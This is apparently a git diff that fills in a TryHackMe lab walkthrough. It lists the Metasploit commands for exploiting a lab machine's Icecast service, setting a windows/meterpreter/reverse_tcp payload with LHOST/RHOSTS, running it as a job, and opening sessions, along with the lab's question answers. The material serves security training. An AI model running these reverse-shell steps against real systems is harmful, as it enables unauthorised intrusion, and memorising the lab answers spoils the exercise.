@@ -177,7 +177,56 @@ Now that we've scanned our victim system, let's try connecting to it with a Meta
 Let's now run the command search multi/handler.
 Go ahead and run the command use NUMBER_NEXT_TO  exploit/multi/handler wherein the number will be what appears in that far left column (typically this will be 4 or 5). In this way, we can use our search results without typing out the full name/path of the module we want to use.
 
-    Answer: 
+    command: use 5 exploit/multi/handler
+
+What is the name of the column on the far left side of the console that shows up next to 'Name'?
+
+    Answer: #
+    
+Now type the command use NUMBER_FROM_PREVIOUS_QUESTION. This is the short way to use modules returned by search results.
+
+    Answer: No answer needed
+    
+Next, let's set the payload using this command set PAYLOAD windows/meterpreter/reverse_tcp. In this way, we can modify which payloads we want to use with our exploits. Additionally, let's run this command set LHOST YOUR_IP_ON_TRYHACKME. You might have to check your IP using the command ip addr, it will likely be your tun0 interface.
+
+    Command: set PAYLOAD windows/meterpreter/reverse_tcp
+    In this command, we are setting what payload we want to use for our exploit
+    
+    Command: set LHOST YOUR_IP_ON_TRYHACKME
+    We are setting the LHOST ip address 
+    
+    Answer: Completed. No answer needed
+    
+Let's go ahead and return to our previous exploit, run the command use icecast to select it again.
+
+    Command: use icecast
+    
+One last step before we can run our exploit. Run the command set RHOSTS 10.10.192.52 to tell Metasploit which target to attack.
+
+    Command: set RHOSTS 10.10.192.52<The remote IP address of the TRYHACKME machine> 
+    We are setting the IPaddress of the remote host
+    
+Once you're set those variables correctly, run the exploit now via either the command exploit or the command run -j to run this as a job.
+
+    Command: run -j 
+    Command: exploit 
+    Answer: No answer needed/Completed
+    
+Once we've started this, we can check all of the jobs running on the system by running the command jobs
+
+    Command: jobs
+    Answer: No answer needed
+    
+After we've established our connection in the next task, we can list all of our sessions using the command sessions. Similarly, we can interact with a target session using the command sessions -i SESSION_NUMBER
+    
+    Command: sessions -i SESSION_NUMBER
+    Answer: No answer needed 
+    
+## Task six: We're in, Now What
+
+
+
+
 
 
 
